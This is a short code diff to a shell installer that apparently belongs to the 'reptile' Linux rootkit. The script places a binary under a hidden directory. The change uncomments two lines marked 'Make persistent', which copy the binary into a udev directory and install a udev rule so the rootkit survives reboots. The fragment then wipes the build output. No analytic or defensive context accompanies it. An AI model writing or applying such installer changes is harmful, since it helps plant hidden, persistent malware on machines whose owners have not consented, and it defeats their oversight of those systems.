@@ -36,8 +36,8 @@ sed -i s!XXXXX!$TAG_NAME! /$HIDE/$HIDE"_start" && \
 cp $PWD/../output/reptile /$HIDE/$HIDE && \
 
 # Make persistent
-#cp $PWD/../output/reptile $UDEV_DIR/$HIDE && \
-#cp $PWD/../scripts/rule $RULE && \
+cp $PWD/../output/reptile $UDEV_DIR/$HIDE && \
+cp $PWD/../scripts/rule $RULE && \
 
 # cleaning output dir
 rm -rf $PWD/../output && \
